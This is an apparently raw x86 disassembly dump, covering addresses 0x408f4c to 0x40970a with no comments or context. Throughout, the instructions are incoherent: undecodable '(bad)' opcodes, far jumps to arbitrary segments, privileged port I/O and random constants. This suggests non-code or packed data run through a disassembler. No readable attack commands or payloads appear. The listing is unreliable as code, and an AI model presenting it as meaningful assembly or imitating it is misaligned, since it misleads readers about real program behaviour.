  408f4c:	inc    edi
  408f4d:	aas    
  408f4e:	(bad)  
  408f4f:	call   0x6faa:0x910e446
  408f56:	mov    ebp,0x443f0f85
  408f5b:	jecxz  0x408fa6
  408f5d:	sbb    eax,0x1b947158
  408f62:	ret    0x895d
  408f65:	das    
  408f66:	xchg   BYTE PTR [ebx-0x5c6fb276],cl
  408f6c:	jae    0x408f0c
  408f6e:	mov    ah,0xf9
  408f70:	dec    ebx
  408f71:	jge    0x408f0f
  408f73:	sbb    edx,DWORD PTR [eax]
  408f75:	adc    al,cl
  408f77:	popa   
  408f78:	fiadd  WORD PTR [ebp-0x2e]
  408f7b:	adc    eax,0x6ec0c802
  408f80:	and    eax,0x799d8ff0
  408f85:	cmp    DWORD PTR fs:[ecx+edx*1-0x45998021],0xffffff9a
  408f8e:	call   0x5538:0xcab41900
  408f95:	push   ecx
  408f96:	mov    cl,dh
  408f98:	ss (bad) 
  408f9b:	cmp    esi,esi
  408f9d:	lods   al,BYTE PTR ds:[esi]
  408f9e:	aam    0x17
  408fa0:	xchg   ebx,eax
  408fa1:	es into 
  408fa3:	jp     0x408ff2
  408fa5:	mul    BYTE PTR [edi-0x46]
  408fa8:	cld    
  408fa9:	lods   al,BYTE PTR ds:[esi]
  408faa:	xchg   ah,dh
  408fac:	ja     0x408f44
  408fae:	and    bl,BYTE PTR [ecx+0x51a16f5b]
  408fb4:	stos   BYTE PTR es:[edi],al
  408fb5:	into   
  408fb6:	push   edx
  408fb7:	jo     0x408fbe
  408fb9:	inc    ebx
  408fba:	push   0x98a22976
  408fbf:	leave  
  408fc0:	dec    ecx
  408fc1:	mov    edi,DWORD PTR [ebx]
  408fc3:	dec    esp
  408fc4:	push   0xfffffff1
  408fc6:	jecxz  0x408f56
  408fc8:	leave  
  408fc9:	inc    edx
  408fca:	inc    ebp
  408fcb:	mov    edi,0xc906635
  408fd0:	sbb    BYTE PTR [esi],ah
  408fd2:	cli    
  408fd3:	sahf   
  408fd4:	mov    eax,ds:0x92ea13df
  408fd9:	sbb    cl,BYTE PTR [edx-0x69]
  408fdc:	sub    al,0x78
  408fde:	inc    edi
  408fdf:	sub    BYTE PTR [edx+0x3e],bh
  408fe2:	test   al,0x78
  408fe4:	sbb    ecx,DWORD PTR [edi+0xa]
  408fe7:	mov    eax,0xb13aa648
  408fec:	cwde   
  408fed:	mov    ds:0x561563d3,al
  408ff2:	lahf   
  408ff3:	sub    DWORD PTR [ebp+0x49c3e6a5],eax
  408ff9:	imul   DWORD PTR [edi+eiz*4+0xd25d5da]
  409000:	andps  xmm6,xmm4
  409003:	fisttp WORD PTR [ebp+0x18b47047]
  409009:	mov    esp,0xd6ed9057
  40900e:	adc    BYTE PTR [eax+ecx*8],bh
  409011:	sub    al,0x85
  409013:	inc    edx
  409014:	stos   DWORD PTR es:[edi],eax
  409015:	xor    ebx,DWORD PTR [ebx]
  409017:	adc    eax,0x46b2f30d
  40901c:	(bad)  
  40901d:	sar    BYTE PTR [ebp+0x784b6252],1
  409023:	push   esi
  409024:	pop    esp
  409025:	retf   0xe6cd
  409028:	jns    0x408fc2
  40902a:	loopne 0x409007
  40902c:	and    bl,BYTE PTR [ebx+ebx*4-0x70dcc033]
  409033:	fdiv   DWORD PTR [edi+0x51038c11]
  409039:	fisubr DWORD PTR cs:[ebx-0x17cdf66d]
  409040:	ret    0x3eaf
  409043:	pushf  
  409044:	adc    BYTE PTR [edx+0x47e3745d],dh
  40904a:	inc    ebp
  40904b:	or     al,0x89
  40904d:	inc    edx
  40904e:	std    
  40904f:	jmp    0x7372f1bc
  409054:	jp     0x40907a
  409056:	shl    BYTE PTR [esi-0x5be735de],cl
  40905c:	mov    dh,0x41
  40905e:	outs   dx,BYTE PTR ds:[esi]
  40905f:	sahf   
  409060:	or     bl,al
  409062:	scas   al,BYTE PTR es:[edi]
  409063:	in     eax,dx
  409064:	adc    eax,0x12f76987
  409069:	pop    eax
  40906a:	and    ecx,DWORD PTR [ebp+0x44930bb1]
  409070:	pop    es
  409071:	fwait
  409072:	mov    esi,0xc064a4c3
  409077:	push   edx
  409078:	sar    al,0xdd
  40907b:	mov    ch,0x32
  40907d:	or     esp,ebp
  40907f:	aaa    
  409080:	in     al,dx
  409081:	lods   eax,DWORD PTR ds:[esi]
  409082:	pop    esp
  409083:	pop    ebp
  409084:	jmp    0x1a8d:0x52ecbfce
  40908b:	aad    0x3e
  40908d:	adc    BYTE PTR [ecx-0x1f],al
  409090:	scas   eax,DWORD PTR es:[edi]
  409091:	leave  
  409092:	mov    al,ds:0xc2204d15
  409097:	and    edi,DWORD PTR [ebp+0x58]
  40909a:	cmp    BYTE PTR [ecx+0x10182397],ah
  4090a0:	push   esp
  4090a1:	pop    ebp
  4090a2:	add    esi,DWORD PTR [eax*1+0x3178c5a2]
  4090a9:	or     esp,esi
  4090ab:	xchg   esp,eax
  4090ac:	pop    ds
  4090ad:	adc    BYTE PTR [ebp+0x68],dh
  4090b0:	add    bh,BYTE PTR [ecx]
  4090b2:	fwait
  4090b3:	push   ebx
  4090b4:	imul   esp,DWORD PTR [esi+0x5356191],0x4d9b4124
  4090be:	aaa    
  4090bf:	adc    eax,0x7e475334
  4090c4:	jle    0x40905d
  4090c6:	je     0x40906a
  4090c8:	sbb    bh,BYTE PTR ss:[edx+0x6e8399b9]
  4090cf:	neg    ah
  4090d1:	sbb    bh,BYTE PTR [edi]
  4090d3:	xor    eax,0x563b2ab0
  4090d8:	aam    0x86
  4090da:	aad    0x81
  4090dc:	mov    ds:0x2daf2960,eax
  4090e1:	shl    BYTE PTR [eax],0x6a
  4090e4:	xchg   esi,eax
  4090e5:	mov    dh,0x6
  4090e7:	icebp  
  4090e8:	push   ds
  4090e9:	int    0x7
  4090eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4090ec:	popf   
  4090ed:	push   ecx
  4090ee:	lea    esi,[ebx+0x107ac51f]
  4090f4:	sahf   
  4090f5:	mov    bh,BYTE PTR [edi+0x6f]
  4090f8:	sbb    bh,BYTE PTR [eax+0x2d]
  4090fb:	sub    DWORD PTR [eax],ebp
  4090fd:	shr    BYTE PTR [esi-0x3e],cl
  409100:	push   eax
  409101:	xor    DWORD PTR [ebp+0x6a],ebx
  409104:	jo     0x409166
  409106:	cmp    DWORD PTR [edx],esp
  409108:	mov    ch,BYTE PTR [ecx+0x122cd9f5]
  40910e:	dec    eax
  40910f:	mov    ds:0xd423368f,eax
  409114:	sar    DWORD PTR [ebx+0x4e],cl
  409117:	mov    fs,ecx
  409119:	push   esi
  40911a:	mov    cl,BYTE PTR [eax]
  40911c:	or     BYTE PTR [edi+ecx*8-0x9],ch
  409120:	push   edi
  409121:	in     al,0x91
  409123:	dec    esp
  409124:	cs mov bl,0x37
  409127:	sub    sp,WORD PTR [eax+0x12c02a69]
  40912e:	adc    DWORD PTR [ebp-0x6ad5f64c],esp
  409134:	mov    al,ds:0xcec88ede
  409139:	aaa    
  40913a:	mov    ebx,fs
  40913c:	mov    ch,0xb4
  40913e:	or     DWORD PTR [ebx+0x4632e0ee],eax
  409144:	inc    ecx
  409145:	inc    ecx
  409146:	pop    ebx
  409147:	mov    eax,0xf32d9d83
  40914c:	ret    
  40914d:	gs scas al,BYTE PTR es:[edi]
  40914f:	sbb    ebx,DWORD PTR [eax]
  409151:	adc    ecx,ecx
  409153:	push   edx
  409154:	stos   BYTE PTR es:[edi],al
  409155:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409156:	pop    ebx
  409157:	mov    WORD PTR [edx+0x78c29508],?
  40915d:	mov    ah,0x67
  40915f:	(bad)  
  409160:	and    BYTE PTR [ebx-0x1166068f],cl
  409166:	ss cs push eax
  409169:	les    esi,FWORD PTR [edx-0x9784b40]
  40916f:	mov    dl,0xc2
  409171:	xchg   DWORD PTR [edx],esi
  409173:	adc    edi,ebx
  409175:	aas    
  409176:	idiv   BYTE PTR [ecx]
  409178:	sbb    BYTE PTR [esi-0x41b5a44d],cl
  40917e:	mov    edx,0x69a00192
  409183:	aam    0x25
  409185:	mov    esp,0xf6db6677
  40918a:	lods   eax,DWORD PTR ds:[esi]
  40918b:	(bad)  [ebx+0x5e]
  40918e:	pop    edx
  40918f:	cmp    DWORD PTR [edi],edi
  409191:	iret   
  409192:	jae    0x4091ef
  409194:	mov    ebx,DWORD PTR [esi-0x12]
  409197:	out    dx,al
  409198:	jno    0x40918e
  40919a:	pop    es
  40919b:	xchg   esp,eax
  40919c:	jge    0x40914c
  40919e:	push   ss
  40919f:	test   eax,0x53414388
  4091a4:	mov    ds:0xb6df6924,eax
  4091a9:	push   ebp
  4091aa:	mov    ebx,DWORD PTR ds:0xc693c97a
  4091b0:	sub    DWORD PTR [ebp-0xe],0x49c9630
  4091b7:	outs   dx,DWORD PTR ds:[esi]
  4091b8:	mov    al,ds:0x545eec17
  4091bd:	sar    DWORD PTR [ecx+0x20],1
  4091c0:	jle    0x4091c6
  4091c2:	ret    0xe59b
  4091c5:	out    0x61,al
  4091c7:	cmp    al,0xb8
  4091c9:	lea    edi,[edi+0x1d202710]
  4091cf:	out    dx,eax
  4091d0:	push   ebx
  4091d1:	pop    ecx
  4091d2:	dec    ebp
  4091d3:	cld    
  4091d4:	jns    0x4091d6
  4091d6:	lods   eax,DWORD PTR ds:[esi]
  4091d7:	fdiv   QWORD PTR [ebx+0x63]
  4091da:	jp     0x409193
  4091dc:	mov    bl,0xda
  4091de:	fcmovu st,st(1)
  4091e0:	add    edi,DWORD PTR [edx+ebp*8]
  4091e3:	dec    edi
  4091e4:	adc    edi,DWORD PTR [edi+0x5d]
  4091e7:	sbb    al,0x4f
  4091e9:	loop   0x4091f7
  4091eb:	dec    edi
  4091ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4091ed:	mov    esi,0x13acd36
  4091f2:	adc    al,0xdc
  4091f4:	fcom   DWORD PTR ds:0xa5b0df06
  4091fa:	jne    0x409252
  4091fc:	jne    0x4091aa
  4091fe:	pop    ebx
  4091ff:	pusha  
  409200:	test   BYTE PTR [esi-0x50f66a0e],al
  409206:	jbe    0x409246
  409208:	or     DWORD PTR [ecx],ebp
  40920a:	or     esp,edi
  40920c:	mov    ebp,DWORD PTR [eax]
  40920e:	and    BYTE PTR [ebp-0x66a287b],bl
  409214:	int    0x1b
  409216:	push   ss
  409217:	mov    ebp,DWORD PTR [eax+0x54]
  40921a:	rcl    DWORD PTR [esi+ebx*8+0x16],0xfd
  40921f:	jle    0x409204
  409221:	shl    DWORD PTR [edi-0x6a],cl
  409224:	fcomp  QWORD PTR gs:[ecx]
  409227:	ret    
  409228:	sub    BYTE PTR [edx],bl
  40922a:	loope  0x409299
  40922c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40922d:	mov    edx,DWORD PTR [ecx+0xb]
  409230:	loope  0x409204
  409232:	lods   al,BYTE PTR ds:[esi]
  409233:	mov    esp,0xd9ede7c9
  409238:	and    al,0x36
  40923a:	je     0x4091db
  40923c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40923d:	dec    ebp
  40923e:	in     al,0x58
  409240:	int    0x34
  409242:	xchg   esi,eax
  409243:	cmp    DWORD PTR ds:0xe19834c2,0x4c
  40924a:	rcr    DWORD PTR [ebx-0x5a],cl
  40924d:	jne    0x409274
  40924f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409250:	adc    DWORD PTR [edx],0x4cc2b077
  409256:	xor    al,0x6b
  409258:	icebp  
  409259:	(bad)  
  40925b:	addr16 enter 0xb920,0x20
  409260:	add    eax,0x81680756
  409265:	cmc    
  409266:	in     al,0x6a
  409268:	dec    ebp
  409269:	int3   
  40926a:	jle    0x409291
  40926c:	repz inc ebx
  40926e:	lock mov ?,esp
  409271:	out    dx,eax
  409272:	cmp    BYTE PTR [esp+eax*1],0x3a
  409276:	sbb    eax,0xfc34368f
  40927b:	xor    DWORD PTR [ecx+0x79f96057],esp
  409281:	retf   
  409282:	push   esp
  409283:	mov    ds:0xfbdaa62e,al
  409288:	pushf  
  409289:	mov    ch,0x29
  40928b:	es test al,0x73
  40928e:	cmp    dh,BYTE PTR [ecx]
  409290:	rol    DWORD PTR [ecx+ecx*1+0xf02da86],cl
  409297:	adc    eax,0xef73e1a1
  40929c:	ja     0x4092f2
  40929e:	dec    edx
  40929f:	out    0x3,al
  4092a1:	push   ebp
  4092a2:	les    edi,FWORD PTR [esi]
  4092a4:	in     al,dx
  4092a5:	jge    0x409233
  4092a7:	(bad)  
  4092a8:	pop    ebp
  4092a9:	mov    edx,0x12f11cf3
  4092ae:	jnp    0x40924b
  4092b0:	pop    ebp
  4092b1:	call   0xa00e:0x2f0178f2
  4092b8:	iret   
  4092b9:	out    0x87,eax
  4092bb:	sahf   
  4092bc:	xchg   edi,eax
  4092bd:	mov    ebx,0x273261c6
  4092c2:	out    dx,al
  4092c3:	jecxz  0x40926f
  4092c5:	jne    0x4092f8
  4092c7:	cmp    bl,ah
  4092c9:	sar    DWORD PTR [edi-0x6a230d6e],1
  4092cf:	mov    bh,dh
  4092d1:	shl    dl,0x16
  4092d4:	xlat   BYTE PTR ds:[ebx]
  4092d5:	shl    BYTE PTR [esi-0xe],0x1e
  4092d9:	mov    dh,0x16
  4092db:	mov    bh,0x39
  4092dd:	aas    
  4092de:	xor    al,0xb0
  4092e0:	aas    
  4092e1:	test   DWORD PTR [eax+eiz*1],edx
  4092e4:	jle    0x40930f
  4092e6:	repz adc edi,edi
  4092e9:	jae    0x409364
  4092eb:	in     al,0x18
  4092ed:	in     al,dx
  4092ee:	addr16 dec ecx
  4092f0:	pop    eax
  4092f1:	dec    edi
  4092f2:	push   0xffffffe7
  4092f4:	rol    BYTE PTR ds:0x11b94f38,1
  4092fa:	bound  ecx,QWORD PTR [eax]
  4092fc:	std    
  4092fd:	mov    ch,0x86
  4092ff:	dec    ebx
  409300:	xchg   ebx,eax
  409301:	dec    esi
  409302:	ret    
  409303:	ret    
  409304:	mov    ecx,DWORD PTR [esi]
  409306:	ins    DWORD PTR es:[edi],dx
  409307:	jp     0x40931e
  409309:	mov    edi,0xc3082e0a
  40930e:	scas   al,BYTE PTR es:[edi]
  40930f:	repz mov ebx,0x8abd3f05
  409315:	mov    BYTE PTR [esi-0x12],cl
  409318:	jmp    0x81b9fb0e
  40931d:	xchg   edx,eax
  40931e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40931f:	out    dx,eax
  409320:	xlat   BYTE PTR ds:[ebx]
  409322:	xor    ebp,esi
  409324:	push   edi
  409325:	adc    DWORD PTR [esi],edx
  409327:	mov    ch,0x14
  409329:	adc    DWORD PTR ss:[eax+ebp*4-0x34],edx
  40932e:	mov    ds,WORD PTR [ebx+eax*8-0x48f700c8]
  409335:	leave  
  409336:	in     eax,0x2c
  409338:	ret    
  409339:	xchg   edi,eax
  40933a:	(bad)  
  40933b:	sbb    al,BYTE PTR [edi]
  40933d:	das    
  40933e:	jbe    0x4092f9
  409340:	dec    ebx
  409341:	pop    eax
  409342:	jno    0x40931a
  409344:	and    esp,0xffffffb6
  409347:	jae    0x4092ed
  409349:	xchg   edx,eax
  40934a:	mul    BYTE PTR [esi-0x60]
  40934d:	cmp    al,BYTE PTR es:[edi+eax*8]
  409351:	sbb    dl,BYTE PTR [ecx-0x19d93e87]
  409357:	ins    BYTE PTR es:[edi],dx
  409358:	xchg   BYTE PTR [ebx],bl
  40935a:	sbb    al,0x46
  40935c:	adc    ch,BYTE PTR [esi-0x5ca52ef5]
  409362:	sahf   
  409363:	test   eax,0x1f0ea006
  409368:	fst    DWORD PTR [eax-0x6c]
  40936b:	pop    esp
  40936c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40936d:	add    bl,dh
  40936f:	xchg   edx,eax
  409370:	int    0xff
  409372:	adc    ch,BYTE PTR [edi+0x7c8aa8d3]
  409378:	push   cs
  409379:	test   DWORD PTR [esi],0xb779c186
  40937f:	jno    0x4093ec
  409381:	retf   0x5c94
  409384:	cmp    al,0xf7
  409386:	add    al,BYTE PTR [esi-0x2a]
  409389:	or     edx,DWORD PTR [ebx-0x7]
  40938c:	xchg   edx,eax
  40938d:	sti    
  40938e:	pop    eax
  40938f:	in     eax,dx
  409390:	(bad)  
  409391:	mov    ch,0x71
  409393:	inc    ecx
  409394:	popa   
  409395:	enter  0x59cd,0x9d
  409399:	xchg   ebx,eax
  40939a:	inc    ebx
  40939b:	lods   eax,DWORD PTR ds:[esi]
  40939c:	or     al,0x10
  40939e:	sbb    BYTE PTR [ebx-0x3185b996],cl
  4093a4:	lds    edi,FWORD PTR [esi]
  4093a6:	std    
  4093a7:	loopne 0x409409
  4093a9:	push   ebp
  4093aa:	xor    BYTE PTR [eax],0x66
  4093ad:	jecxz  0x409353
  4093af:	je     0x409427
  4093b1:	popa   
  4093b2:	xchg   esi,eax
  4093b3:	sar    BYTE PTR [ecx-0x1357e936],1
  4093b9:	(bad)  
  4093ba:	jb     0x4093ac
  4093bc:	or     DWORD PTR [esi+0x58],ecx
  4093bf:	test   al,0x69
  4093c1:	lock fdiv QWORD PTR [edx]
  4093c4:	pop    esp
  4093c5:	es dec esi
  4093c7:	pop    ss
  4093c8:	aad    0xb3
  4093ca:	dec    edx
  4093cb:	test   BYTE PTR [esi+ebp*1],bh
  4093ce:	or     esi,eax
  4093d0:	(bad)  
  4093d1:	stos   DWORD PTR es:[edi],eax
  4093d2:	xchg   edx,eax
  4093d3:	jecxz  0x409404
  4093d5:	mov    ds:0x1d288dfa,al
  4093da:	ret    0xee22
  4093dd:	out    dx,al
  4093de:	in     al,dx
  4093df:	adc    BYTE PTR [edi+0x62],al
  4093e2:	push   ss
  4093e3:	jmp    0x244e517c
  4093e8:	hlt    
  4093e9:	lods   al,BYTE PTR ds:[esi]
  4093ea:	pop    ebp
  4093eb:	mov    bh,0xd4
  4093ed:	idiv   DWORD PTR [eax]
  4093ef:	je     0x40937f
  4093f1:	and    al,0x9f
  4093f3:	xchg   edx,eax
  4093f4:	mov    esp,0xcbcb981
  4093f9:	cld    
  4093fa:	stc    
  4093fb:	xchg   esp,eax
  4093fc:	js     0x409399
  4093fe:	pop    es
  4093ff:	pop    ebp
  409400:	cwde   
  409401:	dec    edx
  409402:	inc    ecx
  409403:	or     ebx,DWORD PTR [edx]
  409405:	push   cs
  409406:	xor    eax,0xa41e0ff1
  40940b:	cs int 0xb6
  40940e:	popa   
  40940f:	pop    ecx
  409410:	(bad)  
  409411:	cmc    
  409412:	xchg   esp,eax
  409413:	xor    bh,0x8
  409416:	imul   ecx,DWORD PTR [ebp+0x3ee65f98],0xbebe4157
  409420:	rcl    BYTE PTR ds:0x9cee,0x7
  409426:	mov    al,0x56
  409428:	or     eax,0x93b0bced
  40942d:	inc    eax
  40942e:	push   0xe87c4849
  409433:	loop   0x4094a1
  409435:	adc    ah,BYTE PTR [esp+esi*8+0x4]
  409439:	inc    ebp
  40943a:	pop    es
  40943b:	mov    ds:0xacda6358,eax
  409440:	retf   0x888e
  409443:	xlat   BYTE PTR ds:[ebx]
  409444:	dec    edi
  409445:	cmp    DWORD PTR [eax-0x1adf6544],esp
  40944b:	div    edi
  40944d:	aam    0x71
  40944f:	mov    bh,0x46
  409451:	jl     0x4094b9
  409453:	jecxz  0x40946c
  409455:	jae    0x40949a
  409457:	lds    edi,FWORD PTR [ebx+0x72]
  40945a:	dec    ecx
  40945b:	fsub   DWORD PTR [edi-0x7c]
  40945e:	jmp    0xcacb3dfc
  409463:	rol    BYTE PTR [edi+0x6a2f069],cl
  409469:	in     al,dx
  40946a:	ds popf 
  40946c:	push   esi
  40946d:	jge    0x40943b
  40946f:	shr    esp,1
  409471:	lods   eax,DWORD PTR ds:[esi]
  409472:	cs clc 
  409474:	dec    ecx
  409475:	push   eax
  409476:	shl    DWORD PTR [esi],cl
  409478:	ins    DWORD PTR es:[edi],dx
  409479:	pop    ecx
  40947a:	jmp    0xda01:0xadbab375
  409481:	les    eax,FWORD PTR [eax+0x1]
  409484:	pusha  
  409485:	mov    BYTE PTR [ecx+eiz*2+0x3],ah
  409489:	es dec esp
  40948b:	or     esp,ebx
  40948d:	out    0x34,al
  40948f:	mov    bh,0xc0
  409491:	inc    esi
  409492:	jg     0x40949e
  409494:	and    DWORD PTR [esi-0x25],esp
  409497:	add    cl,BYTE PTR cs:[ebx]
  40949a:	js     0x409482
  40949c:	xchg   ebp,eax
  40949d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40949e:	(bad)  
  40949f:	jl     0x409461
  4094a1:	cmp    edi,DWORD PTR [esp+edx*1+0x6c]
  4094a5:	int    0x5e
  4094a7:	inc    eax
  4094a8:	pop    esp
  4094a9:	inc    eax
  4094aa:	outs   dx,BYTE PTR ds:[esi]
  4094ab:	mov    al,ds:0x3785624b
  4094b0:	xor    DWORD PTR [edx-0x5900d0a4],eax
  4094b6:	xor    dl,0xbe
  4094b9:	push   ss
  4094ba:	and    eax,0x1440bdf5
  4094bf:	push   esp
  4094c0:	jmp    0x8123fa8d
  4094c5:	fst    DWORD PTR [ecx+0x5f]
  4094c8:	leave  
  4094c9:	sbb    esi,DWORD PTR [edx-0xd]
  4094cc:	push   ebp
  4094cd:	scas   al,BYTE PTR es:[edi]
  4094ce:	mov    edx,0xed2e89b2
  4094d3:	jae    0x409470
  4094d5:	pop    eax
  4094d6:	shl    DWORD PTR [edi+edx*4+0x472a391c],cl
  4094dd:	adc    esi,DWORD PTR [ebx]
  4094df:	gs xchg esi,eax
  4094e1:	cmp    al,0x6e
  4094e3:	or     cl,BYTE PTR [ebx]
  4094e5:	dec    esp
  4094e6:	retf   0xf6
  4094e9:	jb     0x4094c0
  4094eb:	lea    esi,[ebx]
  4094ed:	mov    esi,DWORD PTR [edi-0x5a]
  4094f0:	inc    esp
  4094f1:	push   0x53
  4094f3:	mov    ebp,0xd5962138
  4094f8:	outs   dx,DWORD PTR ds:[esi]
  4094f9:	out    dx,eax
  4094fa:	repnz fdiv DWORD PTR [ecx]
  4094fd:	aas    
  4094fe:	popf   
  4094ff:	aaa    
  409500:	push   eax
  409501:	add    DWORD PTR cs:[ecx+0x7e],ecx
  409505:	mov    WORD PTR [esi],cs
  409507:	sbb    edx,DWORD PTR [ebp+0x38c6d72e]
  40950d:	aad    0x7e
  40950f:	sub    DWORD PTR [edi+eax*4+0x7b],esp
  409513:	dec    ebx
  409514:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409515:	mov    ch,0xd7
  409517:	pop    ss
  409518:	out    0xc3,al
  40951a:	jb     0x4094c1
  40951c:	enter  0xabd3,0xc1
  409520:	gs fwait
  409522:	and    DWORD PTR [ecx-0x22],esi
  409525:	in     eax,dx
  409526:	xor    BYTE PTR [esp+eiz*2+0x4d],al
  40952a:	enter  0x47d3,0xd0
  40952e:	jbe    0x40953b
  409530:	inc    edi
  409531:	mov    ds:0x78944c32,al
  409536:	or     edi,DWORD PTR [ebx]
  409538:	aaa    
  409539:	push   edx
  40953a:	mov    ebx,0xcc92f628
  40953f:	pop    esp
  409540:	fild   DWORD PTR ds:0x505112cc
  409546:	mov    dh,0xf5
  409548:	jge    0x4095a5
  40954a:	daa    
  40954b:	repz sub ebx,ebp
  40954e:	dec    eax
  40954f:	xchg   ebx,eax
  409550:	inc    BYTE PTR [edi+0x754bf35b]
  409556:	jns    0x409580
  409558:	ins    DWORD PTR es:[edi],dx
  409559:	dec    esp
  40955a:	push   DWORD PTR [edi-0x7f1ef9bb]
  409560:	pop    ebx
  409561:	and    eax,0x327453ca
  409566:	push   cs
  409567:	xchg   esp,eax
  409568:	es enter 0x4a93,0x11
  40956d:	stos   BYTE PTR es:[edi],al
  40956e:	pop    ds
  40956f:	ins    DWORD PTR es:[edi],dx
  409570:	xlat   BYTE PTR ds:[ebx]
  409571:	mov    edi,0x2375ef79
  409576:	mov    esi,0x71c124f1
  40957b:	cmp    BYTE PTR [ebx-0x79b15119],0xc
  409582:	adc    al,0x55
  409584:	loope  0x409590
  409586:	jo     0x409568
  409588:	outs   dx,DWORD PTR ds:[esi]
  409589:	fsub   QWORD PTR [ebp+0x14285aad]
  40958f:	imul   edx,DWORD PTR [edi+esi*4+0x48],0xffffffcb
  409594:	jmp    0xf40ebb67
  409599:	dec    esi
  40959a:	mov    cl,0x2
  40959c:	std    
  40959d:	icebp  
  40959e:	jmp    0x4095bb
  4095a0:	push   edx
  4095a1:	xchg   esp,eax
  4095a2:	and    esp,DWORD PTR [ebx+0x5b92ad5d]
  4095a8:	hlt    
  4095a9:	adc    ebx,esp
  4095ab:	dec    eax
  4095ac:	clc    
  4095ad:	aaa    
  4095ae:	add    BYTE PTR ds:0xb745b9c0,al
  4095b5:	cdq    
  4095b6:	loopne 0x4095f4
  4095b8:	mov    DWORD PTR [eax],0xc64609ac
  4095be:	xchg   edi,eax
  4095bf:	fistp  WORD PTR [esi-0x4f86068a]
  4095c5:	fdivr  st(0),st
  4095c7:	dec    edi
  4095c8:	xchg   ecx,eax
  4095c9:	mov    cl,0x70
  4095cb:	cmp    eax,0x4a28ce2d
  4095d0:	test   eax,0x99a6d878
  4095d5:	jo     0x409618
  4095d7:	jmp    0x2756d865
  4095dc:	pop    edi
  4095dd:	fisttp WORD PTR [ebx-0x60adf732]
  4095e3:	retf   0xdddd
  4095e6:	leave  
  4095e7:	fdivr  DWORD PTR [ebx+eax*4+0x1bf95f39]
  4095ee:	pop    edi
  4095ef:	jo     0x409601
  4095f1:	xor    esi,DWORD PTR [edx+ebx*4-0x32]
  4095f5:	scas   eax,DWORD PTR es:[edi]
  4095f6:	pushf  
  4095f7:	and    ebp,ebp
  4095f9:	bound  ecx,QWORD PTR [esi-0x25]
  4095fc:	into   
  4095fd:	js     0x4095ce
  4095ff:	invd   
  409601:	push   es
  409602:	jp     0x4095de
  409604:	pop    esp
  409605:	imul   ebp,DWORD PTR [ebp-0x5f07f9db],0x9
  40960c:	push   eax
  40960d:	xchg   ecx,eax
  40960e:	ret    0xd621
  409611:	fbstp  TBYTE PTR [esp+ebp*1]
  409614:	clc    
  409615:	pop    eax
  409616:	fistp  WORD PTR [ebx+edx*4]
  409619:	nop
  40961a:	gs sbb eax,0x52fa29fe
  409620:	adc    ebx,ebx
  409622:	int3   
  409623:	dec    eax
  409624:	xchg   ebx,eax
  409625:	popa   
  409626:	std    
  409627:	push   ss
  409628:	fcom   st(1)
  40962a:	dec    ebx
  40962b:	xchg   ebx,eax
  40962c:	xchg   DWORD PTR [edx-0xf],ecx
  40962f:	jg     0x4096a0
  409631:	out    0x80,eax
  409633:	sub    ah,BYTE PTR [esi+ebx*8-0x46123804]
  40963a:	jg     0x409662
  40963c:	sbb    al,0xe5
  40963e:	rol    esi,0x4f
  409641:	cmc    
  409642:	mov    fs,WORD PTR ds:0xb7faae4c
  409648:	mov    ?,WORD PTR [edx+0x5c]
  40964b:	mov    esp,0x57175dbc
  409650:	and    edi,DWORD PTR [ebx+0x64]
  409653:	in     al,dx
  409654:	inc    esi
  409655:	mov    edi,0xdb67573a
  40965a:	pop    es
  40965b:	sbb    dh,BYTE PTR [ecx-0x77]
  40965e:	in     eax,0x36
  409660:	push   edi
  409661:	lds    eax,FWORD PTR [eax]
  409663:	mov    ah,0x69
  409665:	fmul   QWORD PTR [edi]
  409667:	add    eax,0x192c9665
  40966c:	pusha  
  40966d:	push   edx
  40966e:	ins    BYTE PTR es:[edi],dx
  40966f:	jmp    0xba5e:0x1dc5115a
  409676:	popa   
  409677:	lds    esp,FWORD PTR [esi-0x2fdef2ba]
  40967d:	xor    al,BYTE PTR [ebp-0x7e8e7437]
  409683:	jbe    0x409674
  409685:	adc    al,0xb1
  409687:	sbb    ah,BYTE PTR [edx-0x7ad592f7]
  40968d:	aaa    
  40968e:	dec    ecx
  40968f:	sub    ebp,ebp
  409691:	leave  
  409692:	jp     0x4096a3
  409694:	loopne 0x409688
  409696:	jge    0x40962f
  409698:	pop    ss
  409699:	mov    cl,0xd8
  40969b:	ss dec ebx
  40969d:	mov    ecx,0x3543434
  4096a2:	jbe    0x40965f
  4096a4:	cmp    dh,BYTE PTR [eax-0x3b]
  4096a7:	clc    
  4096a8:	and    eax,0x5e83cc86
  4096ad:	sbb    ebx,DWORD PTR [eax-0x101f71df]
  4096b3:	fs ja  0x40971b
  4096b6:	jg     0x409667
  4096b8:	sbb    DWORD PTR [edi],edi
  4096ba:	out    0xfe,eax
  4096bc:	cmp    DWORD PTR [edi+0x6],0xfba6d161
  4096c3:	outs   dx,BYTE PTR ds:[esi]
  4096c4:	sti    
  4096c5:	cli    
  4096c6:	adc    al,0xb7
  4096c8:	mov    ch,0xbe
  4096ca:	ins    DWORD PTR es:[edi],dx
  4096cb:	aad    0xca
  4096cd:	inc    edx
  4096ce:	sbb    eax,0xfc4b2a6c
  4096d3:	jmp    0x9f6cc26
  4096d8:	cmp    eax,0xa9888a4b
  4096dd:	or     dh,BYTE PTR [ebp-0xc076aba]
  4096e3:	inc    ebx
  4096e4:	inc    esi
  4096e5:	jp     0x40967d
  4096e7:	outs   dx,BYTE PTR ds:[esi]
  4096e8:	jmp    0x82268bf5
  4096ed:	xlat   BYTE PTR ds:[ebx]
  4096ee:	test   eax,0xcbd1be70
  4096f3:	jnp    0x40971c
  4096f5:	jmp    0x4096d0
  4096f7:	mov    ecx,0xc84b2966
  4096fc:	sbb    dh,BYTE PTR [eax-0x37aec0cf]
  409702:	push   es
  409703:	das    
  409704:	mov    WORD PTR [edx+edi*1-0x36],?
  409708:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409709:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40970a:	push   ss
